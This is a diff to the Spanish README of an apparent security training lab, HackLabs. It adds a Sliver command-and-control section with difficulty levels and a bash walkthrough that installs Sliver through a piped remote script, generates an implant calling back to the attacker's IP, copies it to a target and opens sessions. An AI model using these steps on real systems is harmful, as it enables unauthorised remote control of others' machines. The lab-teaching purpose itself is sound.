@@ -81,6 +81,37 @@ HackLabs incluye un **selector de dificultad** en la barra de navegación (simil
 <details>
 <summary><strong>A01 — IDOR (Broken Access Control)</strong></summary>
 
+<details>
+<summary><strong>C2 — Sliver (Command & Control)</strong></summary>
+
+| Nivel | Comportamiento |
+|-------|---------------|
+| **Easy** | Servidor Sliver en la máquina atacante, generación y ejecución directa del implant en la víctima. `sliver` acepta conexiones mTLS y las sesiones aparecen con `sliver > sessions`. |
+| **Medium** | Implant empaquetado/obfuscado; ejecución en la víctima necesita permisos de usuario; conexiones salientes restringidas parcialmente (filtrado o proxy). Se requiere generar el implant con la IP y arquitectura correctas (`--mtls {{ client_ip }}:443 --os linux --arch amd64`). |
+| **Hard** | Detección por EDR/WAF: ejecución bloqueada, monitorización de procesos y restricciones de red. Requiere técnicas de evasión: ejecución en memoria, migración de procesos, uso de scripts o staged payloads y técnicas de persistencia manuales. |
+
+```bash
+# En Kali (atacante)
+curl -sSL https://sliver.sh/install | sudo bash
+sliver
+sliver > generate --mtls {{ client_ip }}:443 --os linux --arch amd64
+sliver > mtls --lport 443
+
+# Transferir al objetivo y ejecutar
+scp /home/kali/IMPLANT_NAME admin@TARGET_IP:/tmp/
+ssh admin@TARGET_IP
+cd /tmp && ./IMPLANT_NAME
+
+# En Sliver
+sliver > sessions
+sliver > use <ID>
+sliver (ID) > ps
+```
+
+> Nota: `IMPLANT_NAME` se sustituye por el nombre del binario generado; `{{ client_ip }}` se autocompleta desde la plantilla en el entorno web. Usa este desplegable para ver los pasos rápidos del lab C2.
+
+</details>
+
 | Nivel | Comportamiento |
 |-------|---------------|
 | Easy | Devuelve **todos** los campos del usuario (incluye `password_md5` y `password_plain`) |
